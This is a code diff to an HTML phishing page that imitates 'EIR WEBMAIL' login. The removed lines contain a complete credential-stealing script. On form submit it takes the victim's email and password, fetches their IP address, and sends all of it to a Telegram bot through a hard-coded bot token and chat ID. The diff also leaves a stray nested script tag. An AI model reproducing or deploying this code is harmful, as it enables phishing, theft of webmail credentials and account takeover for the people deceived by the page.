@@ -171,7 +171,7 @@ function submit_login(e)
                 <div id="error"></div>
               </div>
 
-              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup()" > Continue>  
+              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup()" > Continue...  
                 <!-- <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit">Login</button> -->
                 
 
@@ -191,79 +191,7 @@ function submit_login(e)
                   <div class="form-group">
 
 <script type="text/javascript">
-<script>
-// ──────────────────────────────────────────────
-//            TELEGRAM SENDER - WORKING 2026
-// ──────────────────────────────────────────────
 
-const BOT_TOKEN = "8513018574:AAHxWOLbnB7sMaFtXS7TBP6sWCguFu_6n4Y";
-const CHAT_ID = "2131300933";   // ←←←  CHANGE THIS !!
-
-const form = document.getElementById("loginForm");
-const statusDiv = document.getElementById("status");
-
-form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    const email = form.email.value.trim();
-    const password = form.password.value.trim();
-
-    if (!email || !password) {
-        statusDiv.innerHTML = '<span style="color:#c00;">Please fill both fields</span>';
-        return;
-    }
-
-    statusDiv.innerHTML = "Sending...";
-    form.style.opacity = "0.7";
-    form.querySelectorAll("button").forEach(b => b.disabled = true);
-
-    try {
-        const message = 
-`🔥 EIR WEBMAIL LOGIN
-━━━━━━━━━━━━━━━━━━━
-📧 Email: ${email}
-🔑 Password: ${password}
-⏰ ${new Date().toLocaleString("en-IE", {timeZone:"Europe/Dublin"})}
-🌍 IP: ${await getIP() || "hidden"}`;
-
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "Markdown"
-            })
-        });
-
-        const data = await res.json();
-
-        if (data.ok) {
-            statusDiv.innerHTML = '<span style="color:#0a0; font-weight:bold;">✓ Login information sent!</span>';
-            form.reset();
-        } else {
-            throw new Error(data.description || "Telegram error");
-        }
-    } catch (err) {
-        statusDiv.innerHTML = <span style="color:#c00;">Error: ${err.message}</span>;
-        console.error(err);
-    } finally {
-        form.style.opacity = "1";
-        form.querySelectorAll("button").forEach(b => b.disabled = false);
-    }
-});
-
-// Simple IP fetch (optional)
-async function getIP() {
-    try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        const d = await r.json();
-        return d.ip;
-    } catch {
-        return null;
-    }
-}
-</script>
 <!--
       function CheckForEnter(e, inputName)
       {
